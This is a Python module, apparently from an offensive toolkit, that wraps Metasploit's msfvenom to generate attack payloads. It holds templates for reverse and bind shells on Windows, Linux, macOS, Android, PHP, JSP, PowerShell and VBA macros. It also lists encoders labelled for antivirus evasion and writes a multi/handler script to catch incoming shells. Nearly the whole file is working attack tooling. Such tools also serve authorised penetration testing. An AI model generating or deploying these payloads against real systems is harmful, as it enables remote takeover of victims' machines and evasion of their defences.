"""Payload Generator — msfvenom wrapper for generating attack payloads."""

from __future__ import annotations

import subprocess
import tempfile
from pathlib import Path
from typing import Optional

from core.logger import get_logger, get_audit_logger

log = get_logger("payload_gen")


# Common payload templates
PAYLOAD_TEMPLATES = {
    "Windows Reverse Shell (Meterpreter)": {
        "payload": "windows/meterpreter/reverse_tcp",
        "format": "exe",
        "extension": ".exe",
        "arch": "x86",
        "platform": "windows",
    },
    "Windows x64 Reverse Shell (Meterpreter)": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "exe",
        "extension": ".exe",
        "arch": "x64",
        "platform": "windows",
    },
    "Linux Reverse Shell (Meterpreter)": {
        "payload": "linux/x86/meterpreter/reverse_tcp",
        "format": "elf",
        "extension": ".elf",
        "arch": "x86",
        "platform": "linux",
    },
    "Linux x64 Reverse Shell": {
        "payload": "linux/x64/shell/reverse_tcp",
        "format": "elf",
        "extension": ".elf",
        "arch": "x64",
        "platform": "linux",
    },
    "Python Reverse Shell": {
        "payload": "python/meterpreter/reverse_tcp",
        "format": "raw",
        "extension": ".py",
        "arch": "",
        "platform": "python",
    },
    "PHP Reverse Shell": {
        "payload": "php/meterpreter/reverse_tcp",
        "format": "raw",
        "extension": ".php",
        "arch": "",
        "platform": "php",
    },
    "ASP.NET Reverse Shell": {
        "payload": "windows/meterpreter/reverse_tcp",
        "format": "asp",
        "extension": ".asp",
        "arch": "x86",
        "platform": "windows",
    },
    "JSP Reverse Shell": {
        "payload": "java/jsp_shell_reverse_tcp",
        "format": "raw",
        "extension": ".jsp",
        "arch": "",
        "platform": "java",
    },
    "PowerShell Reverse Shell": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "psh",
        "extension": ".ps1",
        "arch": "x64",
        "platform": "windows",
    },
    "Windows Bind Shell": {
        "payload": "windows/meterpreter/bind_tcp",
        "format": "exe",
        "extension": ".exe",
        "arch": "x86",
        "platform": "windows",
    },
    "Bash Reverse Shell": {
        "payload": "cmd/unix/reverse_bash",
        "format": "raw",
        "extension": ".sh",
        "arch": "",
        "platform": "unix",
    },
    "Android Reverse Shell": {
        "payload": "android/meterpreter/reverse_tcp",
        "format": "raw",
        "extension": ".apk",
        "arch": "",
        "platform": "android",
    },
    "macOS Reverse Shell": {
        "payload": "osx/x64/meterpreter/reverse_tcp",
        "format": "macho",
        "extension": "",
        "arch": "x64",
        "platform": "osx",
    },
    "Shellcode (Windows x64)": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "c",
        "extension": ".c",
        "arch": "x64",
        "platform": "windows",
    },
    "VBA Macro": {
        "payload": "windows/meterpreter/reverse_tcp",
        "format": "vba",
        "extension": ".vba",
        "arch": "x86",
        "platform": "windows",
    },
}

# Encoders for AV evasion
ENCODERS = [
    "",  # No encoding
    "x86/shikata_ga_nai",
    "x86/xor",
    "x86/alpha_mixed",
    "x86/countdown",
    "x64/xor",
    "x64/zutto_dekiru",
    "cmd/powershell_base64",
    "php/base64",
    "ruby/base64",
]

# Output formats
OUTPUT_FORMATS = [
    "raw", "exe", "elf", "macho", "dll", "so",
    "asp", "aspx", "jsp", "war", "psh", "psh-cmd",
    "vba", "vba-exe", "vbs", "bash", "sh",
    "c", "csharp", "python", "perl", "ruby",
    "hex", "base64", "num",
]


class PayloadGenerator:
    """Generate attack payloads using msfvenom.

    Features:
      - Template-based payload generation
      - Custom payload + options
      - Multiple output formats
      - Encoder support for AV evasion
      - Multi-iteration encoding
      - Bad character avoidance
    """

    def __init__(self, output_dir: str = "") -> None:
        self._output_dir = Path(output_dir) if output_dir else Path(tempfile.mkdtemp(prefix="holocaust_payloads_"))
        self._output_dir.mkdir(parents=True, exist_ok=True)

    @property
    def output_dir(self) -> Path:
        return self._output_dir

    @staticmethod
    def list_payloads(platform: str = "", arch: str = "") -> list[str]:
        """List available msfvenom payloads."""
        try:
            cmd = ["msfvenom", "--list", "payloads"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            payloads = []
            for line in result.stdout.splitlines():
                line = line.strip()
                if "/" in line and not line.startswith("=") and not line.startswith("Name"):
                    name = line.split()[0] if line.split() else ""
                    if name:
                        if platform and platform not in name:
                            continue
                        if arch and arch not in name:
                            continue
                        payloads.append(name)
            return payloads
        except Exception as e:
            log.error(f"Failed to list payloads: {e}")
            return []

    def generate(self, payload: str, lhost: str, lport: int,
                 fmt: str = "exe", encoder: str = "", iterations: int = 1,
                 bad_chars: str = "", extra_options: dict | None = None,
                 filename: str = "") -> Optional[str]:
        """Generate a payload with msfvenom.

        Args:
            payload: Payload name (e.g., windows/meterpreter/reverse_tcp)
            lhost: Listener IP address
            lport: Listener port
            fmt: Output format (exe, elf, raw, etc.)
            encoder: Encoder name (empty = no encoding)
            iterations: Number of encoding iterations
            bad_chars: Bad characters to avoid (e.g., "\\x00\\x0a\\x0d")
            extra_options: Additional payload options
            filename: Custom output filename (auto-generated if empty)

        Returns:
            Path to generated payload file, or None on failure
        """
        audit = get_audit_logger()
        if audit:
            audit.log_action("payload_generate", payload,
                             f"lhost={lhost}, lport={lport}, fmt={fmt}, encoder={encoder}")

        if not filename:
            safe_payload = payload.replace("/", "_")
            ext = self._extension_for_format(fmt)
            filename = f"payload_{safe_payload}_{lport}{ext}"

        output_path = self._output_dir / filename

        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", str(output_path),
        ]

        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        if bad_chars:
            cmd.extend(["-b", bad_chars])

        # Add extra options
        if extra_options:
            for key, value in extra_options.items():
                cmd.append(f"{key}={value}")

        log.info(f"Generating payload: {payload} -> {output_path}")

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=120,
            )

            if result.returncode != 0:
                log.error(f"msfvenom failed: {result.stderr}")
                return None

            if output_path.exists():
                size = output_path.stat().st_size
                log.info(f"Payload generated: {output_path} ({size} bytes)")
                return str(output_path)
            else:
                log.error("msfvenom completed but output file not found")
                return None

        except FileNotFoundError:
            log.error("msfvenom not found — install Metasploit Framework")
            return None
        except subprocess.TimeoutExpired:
            log.error("msfvenom timed out")
            return None
        except Exception as e:
            log.error(f"Payload generation failed: {e}")
            return None

    def generate_from_template(self, template_name: str, lhost: str, lport: int,
                               encoder: str = "", iterations: int = 1) -> Optional[str]:
        """Generate payload from a predefined template.

        Args:
            template_name: Key from PAYLOAD_TEMPLATES
            lhost: Listener IP
            lport: Listener port

        Returns:
            Path to generated file or None
        """
        template = PAYLOAD_TEMPLATES.get(template_name)
        if not template:
            log.error(f"Unknown template: {template_name}")
            return None

        return self.generate(
            payload=template["payload"],
            lhost=lhost,
            lport=lport,
            fmt=template["format"],
            encoder=encoder,
            iterations=iterations,
        )

    def generate_multi_handler_rc(self, payload: str, lhost: str, lport: int) -> str:
        """Generate Metasploit multi/handler resource script.

        Returns path to .rc file that can be loaded with msfconsole -r
        """
        rc_content = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {payload}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"exploit -j -z\n"
        )

        rc_path = self._output_dir / f"handler_{lport}.rc"
        rc_path.write_text(rc_content)
        log.info(f"Handler RC file: {rc_path}")
        return str(rc_path)

    @staticmethod
    def _extension_for_format(fmt: str) -> str:
        extensions = {
            "exe": ".exe", "dll": ".dll", "elf": ".elf",
            "macho": "", "so": ".so", "asp": ".asp",
            "aspx": ".aspx", "jsp": ".jsp", "war": ".war",
            "psh": ".ps1", "psh-cmd": ".bat", "vba": ".vba",
            "vba-exe": ".vba", "vbs": ".vbs", "bash": ".sh",
            "sh": ".sh", "c": ".c", "csharp": ".cs",
            "python": ".py", "perl": ".pl", "ruby": ".rb",
            "raw": ".bin", "hex": ".hex", "base64": ".b64",
        }
        return extensions.get(fmt, "")

    @staticmethod
    def check_msfvenom() -> bool:
        """Check if msfvenom is available."""
        try:
            result = subprocess.run(
                ["msfvenom", "--version"],
                capture_output=True, text=True, timeout=10,
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False
